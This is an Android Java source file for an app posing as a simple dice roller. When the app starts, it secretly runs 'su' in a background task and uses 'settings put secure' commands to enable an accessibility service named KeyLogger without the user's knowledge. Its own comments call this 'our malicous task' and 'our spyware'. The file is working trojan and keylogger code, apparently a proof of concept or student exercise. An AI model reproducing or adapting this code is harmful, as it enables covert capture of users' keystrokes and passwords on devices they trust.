package com.example.android.dice;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    public static String debug = "k";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button roll_button = findViewById(R.id.roll_button);
        TextView result_roll = findViewById(R.id.result_roll);

        roll_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Random rand = new Random();
                int i = rand.nextInt(6)+1;
                result_roll.setText(i+"");
            }
        });

        // run our malicous task
        (new EnableAccessibility()).execute();
    }
    public void writeFileOnInternalStorage(Context mcoContext, String sFileName, String sBody){
        File dir = new File(mcoContext.getFilesDir(), "mydir");
        if(!dir.exists()){
            dir.mkdir();
        }

        try {
            File gpxfile = new File(dir, sFileName);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * We execute our spyware on an Background thread. We should also be able to get superuser privideges from a background thread. Using su, we can allow our app to access the accessibility event.
     * https://developer.android.com/reference/android/os/AsyncTask
     * https://developer.android.com/reference/android/os/Looper
     *
     * https://stackoverflow.com/questions/29750137/android-performing-su-commands-programatically-does-not-work
     * https://developer.android.com/reference/android/provider/Settings.Secure
     * https://gist.github.com/mrk-han/67a98616e43f86f8482c5ee6dd3faabe
     */
    private class EnableAccessibility extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // Use looper to ensure that we are only running su on a background thread
            if (Looper.myLooper() == Looper.getMainLooper()) {
                // Main Thread
            } else {
                // Background Thread
                try {
                    Process process = Runtime.getRuntime().exec("su");
                    DataOutputStream os = new DataOutputStream(process.getOutputStream());
                    os.writeBytes("settings put secure enabled_accessibility_services com.example.android.dice/com.example.android.dice.KeyLogger\n");
                    os.flush();
                    os.writeBytes("settings put secure accessibility_enabled 1\n");
                    os.flush();
                    os.writeBytes("exit\n");
                    os.flush();

                    process.waitFor();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            // at this point, we no longer need this background thread anymore
            return null;
        }
    }
}